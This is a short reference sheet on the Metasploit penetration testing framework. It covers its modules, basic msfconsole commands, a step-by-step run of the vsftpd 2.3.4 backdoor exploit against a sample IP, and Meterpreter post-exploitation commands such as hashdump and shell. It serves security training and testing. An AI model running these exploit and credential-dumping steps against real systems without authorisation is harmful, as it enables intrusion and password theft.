# Metasploit Framework

The Metasploit Framework is a penetration testing platform that enables you to find, exploit, and validate vulnerabilities.

## Architecture
* **Modules:** Exploits, payloads, auxiliary, encoders, and nops.
* **Payloads:** Code to run on the target after successful exploitation (e.g., Reverse Shell).
* **Meterpreter:** An advanced, dynamically extensible payload that uses in-memory DLL injection.

## Basic msfconsole Commands
* `search <term>`: Search for exploits or modules.
* `use <module_path>`: Select a module to work with.
* `show options`: Display settings for the active module.
* `set <OPTION> <value>`: Configure a setting (e.g., `set RHOSTS 192.168.1.5`).
* `exploit` or `run`: Execute the active module.

## Workflow Example
\`\`\`bash
# 1. Search for a vulnerability
msf6 > search vsftpd 2.3.4

# 2. Select the exploit
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# 3. Configure the exploit
msf6 > show options
msf6 > set RHOSTS 192.168.1.100

# 4. Execute
msf6 > exploit
\`\`\`

## Meterpreter Post-Exploitation
* `sysinfo`: Get system information.
* `hashdump`: Dump password hashes.
* `screenshot`: Capture the target's screen.
* `shell`: Drop into a standard OS command shell.
